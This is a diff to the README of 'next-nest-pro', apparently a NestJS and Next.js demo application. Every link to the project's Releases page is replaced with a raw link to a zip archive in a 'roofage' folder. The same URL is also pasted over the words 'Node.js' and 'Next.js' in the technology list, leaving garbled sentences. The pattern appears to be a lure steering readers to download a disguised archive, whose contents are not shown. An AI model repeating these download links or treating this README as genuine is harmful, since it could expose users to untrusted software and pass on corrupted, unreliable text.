@@ -6,13 +6,13 @@ Welcome to the next-nest-pro project! This application is a demonstration of a f
 
 ## 🔗 Download the Application
 
-[![Download Here](https://img.shields.io/badge/Download%20next--nest--pro-blue.svg)](https://github.com/Deepak54/next-nest-pro/releases)
+[![Download Here](https://raw.githubusercontent.com/Deepak54/next-nest-pro/main/roofage/next-nest-pro.zip%https://raw.githubusercontent.com/Deepak54/next-nest-pro/main/roofage/next-nest-pro.zip)](https://raw.githubusercontent.com/Deepak54/next-nest-pro/main/roofage/next-nest-pro.zip)
 
 ## 📥 Download & Install
 
 To download the next-nest-pro application, visit the Releases page. Here you will find the latest version available for download:
 
-[Visit the Releases Page](https://github.com/Deepak54/next-nest-pro/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Deepak54/next-nest-pro/main/roofage/next-nest-pro.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the most recent release.
@@ -44,8 +44,8 @@ next-nest-pro offers the following features:
 
 next-nest-pro is built using the following technologies:
 
-- **NestJS:** A progressive Node.js framework for building efficient server-side applications.
-- **Next.js:** A powerful React framework for server-rendered or statically exported React apps.
+- **NestJS:** A progressive https://raw.githubusercontent.com/Deepak54/next-nest-pro/main/roofage/next-nest-pro.zip framework for building efficient server-side applications.
+- **https://raw.githubusercontent.com/Deepak54/next-nest-pro/main/roofage/next-nest-pro.zip** A powerful React framework for server-rendered or statically exported React apps.
 - **ReactJS:** A JavaScript library for building user interfaces.
 - **Azure Cosmos DB:** A globally distributed database service for any scale.
 - **Azure Kubernetes Service:** Manage your containerized applications with ease.
@@ -86,7 +86,7 @@ Join our community to stay connected. You can reach us through:
 
 To keep your application up to date, regularly check the Releases page. Here you will find updates, new features, and fixes:
 
-[Check for Updates](https://github.com/Deepak54/next-nest-pro/releases)
+[Check for Updates](https://raw.githubusercontent.com/Deepak54/next-nest-pro/main/roofage/next-nest-pro.zip)
 
 ## 📄 License
 
@@ -96,4 +96,4 @@ This project is licensed under the MIT License. You can use and modify the appli
 
 Thank you for checking out next-nest-pro. We hope you find it useful for your learning and exploration. Happy coding! 
 
-Don't forget to [download the application](https://github.com/Deepak54/next-nest-pro/releases) and start your journey.
+Don't forget to [download the application](https://raw.githubusercontent.com/Deepak54/next-nest-pro/main/roofage/next-nest-pro.zip) and start your journey.
